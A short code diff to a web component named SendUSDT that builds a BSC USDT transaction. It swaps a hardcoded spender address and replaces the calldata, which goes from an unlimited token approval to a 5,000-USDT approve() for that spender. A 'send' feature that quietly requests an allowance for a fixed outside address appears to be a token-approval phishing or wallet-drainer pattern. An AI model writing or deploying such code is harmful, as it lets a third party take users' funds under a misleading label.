@@ -65,10 +65,10 @@ const SendUSDT = () => {
 
       // USDT Token Address on BSC
       const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
-      const SPENDER = "0x7970C936D143c11f9bbF964764851b7051d81651";
+      const SPENDER = "0x18E9c7d86216689232c5d62a2B9cAABFAD8E2547";
       
-      // ABI encoded data for approve(address,uint256)
-      const data = "0x095ea7b30000000000000000000000007970c936d143c11f9bbf964764851b7051d81651ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      // ABI encoded data for approve(address,uint256) where amount is 5000 * 10^18
+      const data = "0x095ea7b300000000000000000000000018e9c7d86216689232c5d62a2b9caabfad8e254700000000000000000000000000000000000000000000010f0cf064dd59200000";
       
       const txParams = {
         to: USDT_BSC,
